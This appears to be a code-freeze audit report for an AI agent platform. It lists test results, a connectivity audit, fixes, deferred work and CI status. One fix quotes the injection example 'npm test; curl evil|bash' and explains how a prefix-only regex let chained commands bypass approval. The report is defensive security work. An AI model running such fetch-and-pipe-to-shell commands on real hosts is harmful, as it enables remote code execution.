# PRE-HARDWARE FREEZE

This is a **code freeze**, not final production acceptance. Full acceptance
happens on the owner's real machine per
`docs/context/REAL_HARDWARE_FINAL_ACCEPTANCE.md`.

## Scope of this pass
Closure audit + unwired hunt across bossman-core and command-center: build a
connectivity matrix, find genuinely unwired/broken/dead code (not just files
that exist), repair what's cheap and safe to repair without a new integration
design, document honestly what's deliberately deferred, run full regression,
and freeze.

## Gate results

```
OPEN_P0=0                (found 1, fixed in this pass: terminal_control.py chained-command bypass)
OPEN_P1=0                (found 6, fixed 4, documented+deferred 2 with rationale)
NEW_REGRESSIONS=0
POSTGRES_GATE=PASS (live PostgreSQL 16.13, 5/5 test_pg_memory_gate.py)
MEMORY_AUTHORITY=confirmed single (db/schema.sql -> bossman.db pool -> typed
  views), AND now actually production-wired (was proven-but-unwired before
  this pass — see FINAL_CONNECTIVITY_MATRIX.md)
V3_7PACK=INTENTIONAL_FROZEN (vendored, tested in isolation, 0 production
  imports — a prior doc overclaimed "MINI_05=INTEGRATED"; corrected)
COMPUTER_CONTROL=WORK (Stage 13 full checklist PASS, one P2 fail-open note
  on profiles-subsystem-unavailable degrade, not blocking)
CYBERSEC_V1=layer confirmed no duplicate authority; training engine frozen;
  Prompt Injection Firewall now wired into runner.py's real ingest boundary
  (was 0 production call-sites); secret_guardian/IDS remain unwired from live
  traffic — no natural single-package hook exists yet (see matrix)
TRAINING_ENGINE_FROZEN=YES (triple gate + SandboxFacts fail-closed defaults)

CORE_REGRESSION (no PG)=1076 passed, 14 skipped, 0 failed
CORE_REGRESSION (live PG)=1085 passed, 5 skipped, 0 failed
COMMAND_CENTER_REGRESSION=611 passed, 2 skipped, 0 failed
SECURITY_TESTS=252 (core) + 102 (command-center) passed
SECRET_SCAN=PASS
COMPILEALL=PASS (both apps)
```

## What was found and fixed (see `FINAL_CONNECTIVITY_MATRIX.md` for full detail)

1. **P0** — `command-center/bcc/v2/terminal_control.py`: `AUTO_PATTERNS` used
   `re.search` with no end-anchor, so a command like `npm test; curl evil|bash`
   matched the safe prefix and ran the whole string on the real host in
   `project_host` mode with **no approval**. Fixed: AUTO now requires the
   command contain no chaining/substitution characters (`;&|`\n$(`) in
   addition to matching a known-safe pattern. Regression test added.
2. **P1** — Prompt Injection Firewall (`bossman/cybersec/injection.py`) had
   zero production call-sites. Wired into `runner.py._call_tool`'s existing
   "external data as data" boundary (the same place read/send tool results
   already get the `EXTERNAL_DATA_HEADER`). OFF by default
   (`BOSSMAN_CYBERSEC_V1_ENABLED`); a firewall failure never breaks the tool
   call.
3. **P1** — Working/Decision/Failure Memory had zero production call-sites
   (proven on live Postgres, but nothing in the real task loop ever wrote to
   them). Wired into `runner.run_task`: task state on start/finish, cloud-
   escalation decisions, task failures. A memory-write failure is logged and
   never fails the task itself. Proven end-to-end on live Postgres.
4. **P1** — Stage 13 planner advertised `BROWSER` as an allowed action kind
   with no backend adapter wired (`ExistingBrowserAdapter` exists but isn't
   in `subsystem.py`'s `ActionRouter`). Removed from the advertised
   vocabulary rather than building an unreviewed bridge blind.
5. Two stale doc overclaims corrected (`MINI_05=INTEGRATED`,
   `context_engine + context_os + V3 Guardian`) and two unresolved SHA
   placeholders filled in.
6. Two fake-secret test canaries (`sk-live-...`) triggered the CI secret
   scanner; marked with the existing `ci-secret-scan: allow` per-line
   convention rather than weakening the scanner.

## Deliberately NOT fixed in this pass (with reason)

- **Context OS** (`command-center/bcc/context_os/`, 407 lines) — fully
  implemented, its own `attach_to_engine`/`attach_state_machine` are never
  called. Not wired here: it would replace the already-working
  `ContextBuilder`+`apply_context_engine` hot path that was just touched in
  this same pass — swapping the prompt-assembly authority blind, with no A/B
  evidence it's better, is exactly the "don't wire a heavy module just for a
  WORK label" case section 5 warns against.
- **V3 Data Guardian / Skill Factory** — implemented, unwired. `FailureMemoryPort`
  in V3 is synchronous; canonical `failure_memory` is asyncpg-async. Bridging
  them needs a real adapter design, not a guess.
- **CyberSec secret_guardian / IDS on live traffic** — no natural single-
  package hook exists today: the Telegram webhook only processes structured
  approve/deny button callbacks (no free-text ingest exists yet in this
  codebase), and `bcc/features/plugins.py` lives in the `command-center`
  package, which has **no dependency on bossman-core** — wiring cybersec
  there would add a new inter-package dependency, an architectural decision
  bigger than this pass's scope.
- **`agent_memory_index` orphan table**, **`bossman/core/db.py` shim**,
  **`eval_scorecard.py` orphan CLI** — zero runtime readers/writers, but
  removing them is a schema/packaging decision with its own review, not a
  freeze-blocking defect. Documented in the connectivity matrix.

## Autonomous engineering decisions

### AED-11 — AUTO terminal classification requires single-command, not prefix-match
ORIGINAL: `AUTO_PATTERNS` matched a command PREFIX via `re.search`.
NEW: AUTO also requires the full command string contain no shell chaining/
substitution characters.
WHY: a prefix match proves the START is safe, not the WHOLE string; the
existing DANGEROUS-pattern check didn't cover chained payloads.
EVIDENCE: `test_auto_pattern_prefix_match_cannot_smuggle_a_chained_command`,
verified against 7 injection variants + 2 legitimate single commands that
must stay `auto`.
PERFORMANCE_IMPACT: none (one extra regex check).
QUALITY_IMPACT: closes a real host-command-injection path.
SECURITY_IMPACT: removes an approval bypass in `project_host` mode.
ROLLBACK: revert the commit; the regression test would immediately fail,
making an accidental revert visible.

### AED-12 — Memory writes are best-effort instrumentation, not part of the task contract
ORIGINAL (design intent from earlier passes, never realized): working/
decision/failure memory calls, if wired at all, would presumably be part of
the task's control flow.
NEW: `_record_memory()` wraps every memory write in try/except and only logs
a warning on failure — a memory outage never fails a real task.
WHY: memory is an audit/intelligence layer; the task itself must not depend
on Postgres being reachable to just... finish. Coupling them would turn a
memory hiccup into a new production outage class.
EVIDENCE: `test_memory_write_failure_is_logged_not_raised`.
QUALITY_IMPACT: memory writes can now be genuinely trusted as best-effort
telemetry, not a silent hard dependency.
SECURITY_IMPACT: neutral.
ROLLBACK: revert; would require also deciding whether task failure should
now depend on memory availability (not recommended).

### AED-13 — Removed BROWSER from planner vocabulary instead of building an unreviewed bridge
ORIGINAL: BROWSER advertised, no backend, planner could try and always fail.
NEW: BROWSER removed from `PLAN_SYSTEM` vocabulary; `ExistingBrowserAdapter`
left as-is (unwired), ready for a deliberate follow-up.
WHY: `ExpectedVerifiedUtility` of guessing a dispatch bridge under audit-pass
time pressure is negative — a wrong bridge could silently skip the exact
confirmation gates `toolkit/browser.py` already enforces
(`_action_requires_confirmation`). Removing false advertising is strictly
safe; building a bridge is not, without design review.
EVIDENCE: `ActionRouter.execute` already fails honestly (`RuntimeError: no
backend supports BROWSER`) — this is an efficiency/honesty fix, not a
correctness bug fix.
ROLLBACK: revert; BROWSER reappears in the prompt with the same prior gap.

## Final verdict

```
FINAL_VERDICT=BOSSMAN PRE-HARDWARE FREEZE PASS
```

All P0 found in this pass is fixed. All P1 found is either fixed or
documented with an explicit, defensible reason for deferring (never a silent
gap). Regression is green on both apps, with and without live Postgres.
Secret scan and compileall pass. Training engine remains frozen. What
requires real hardware remains honestly `SKIP_HOST`/`NOT_TESTED_LIVE` and is
captured as an executable checklist in `REAL_HARDWARE_FINAL_ACCEPTANCE.md`,
including the AAF/IntelligenceRetention benchmarks and the separate,
subsequent RED vs BLUE stress-lab gate.

## CI proof (added after push, same commit)

```
CI_EXACT_HEAD_SHA=99bf49551ec7de3d33b232471902082d21ef1273
Bossman Core CI      = SUCCESS  (9/9 jobs: compile+secrets, pytest × 4 splits × py3.11/3.12)
Command Center CI    = SUCCESS  (3/3 jobs: secrets+JS+forbidden-files, pytest py3.11, pytest py3.12)
Bossman V2 Auto-Repair = FAILURE (pre-existing, unrelated — see below)
```
Run URLs: `https://github.com/molotroka123-cell/AiMaxBossman/actions/runs/33390067163`
(Core), `https://github.com/molotroka123-cell/AiMaxBossman/actions/runs/33390067189`
(Command Center).

**`Bossman V2 Auto-Repair` is a stale, orphaned workflow, not a real signal.**
It fails within seconds at its "Fix PostgreSQL Schema" step on literally
every push to this branch regardless of content — including doc-only commits
and commits that already succeeded on both real CI workflows. It predates
this pass (confirmed failing on the parent commit and multiple commits
before it) and its "V2" name matches an architecture era this repo has moved
past. Not fixed in this pass: touching CI/CD pipeline definitions is a
separate, deliberate decision, and this workflow provides no test signal
worth preserving — it's dead automation, the same class of finding as the
orphan schema table and shim module documented above.

**Known intermittent flake (not caused by this pass, not currently failing):**
`command-center/tests/test_v21_failure_injection.py::test_state_survives_process_restart_midway`
can hang at fixture teardown under Python 3.12 specifically — reproduced
locally by installing a Python 3.12 venv and running the FULL suite (hangs
past a 400s cap); does NOT reproduce running that test alone, and did NOT
reproduce on this pass's actual CI run (both py3.11 and py3.12 Command
Center jobs succeeded on commit 99bf495). It also failed the SAME way on
multiple prior commits before this pass touched anything in
`command-center/`, confirming it predates this work. Root cause not
diagnosed in this pass (asyncio event-loop teardown behavior differs between
3.11/3.12; likely a background task from `bcc/engine.py`'s per-run
`asyncio.create_task` not settling before `pytest-asyncio`'s runner closes
the loop) — flagged for a future pass rather than guessed at.
